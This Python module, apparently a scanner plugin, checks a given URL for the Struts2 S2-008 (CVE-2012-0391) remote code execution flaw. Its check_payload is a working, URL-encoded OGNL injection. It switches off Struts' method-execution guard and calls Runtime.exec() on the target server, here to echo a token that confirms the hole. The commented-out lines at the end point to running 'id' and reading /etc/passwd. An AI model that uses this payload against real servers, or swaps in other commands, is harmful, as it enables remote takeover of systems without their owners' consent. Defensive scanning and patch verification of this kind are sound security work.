#!/usr/bin/env python3

import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_008_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-008漏洞,又名CVE-2012-0391漏洞',
            'description': 'Struts2 S2-008漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.17',
            'date': '2012-01-02',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/devmode.action'
        self.capta = get_capta() 
        self.check_payload =  '?debug=command&expression=%28%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28"false"%29%20%2C%23context%5B"xwork.MethodAccessor.denyMethodExecution"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27''' + urllib.parse.quote(('echo' + ' ' + self.capta), 'utf-8') + '''%27%29.getInputStream%28%29%29%29'''
    
    def run(self):
        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """

        try:
            check_url = self.url + self.check_payload
            check_res = request.get(check_url)
            if check_res.status_code == 200 and len(check_res.text) < 50 and self.capta in check_res.text:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_008 = S2_008_BaseVerify('http://localhost:8080/s2_008_war_exploded/')
    # print(S2_008.cmd('id'))
    # print(S2_008.read('/etc/passwd'))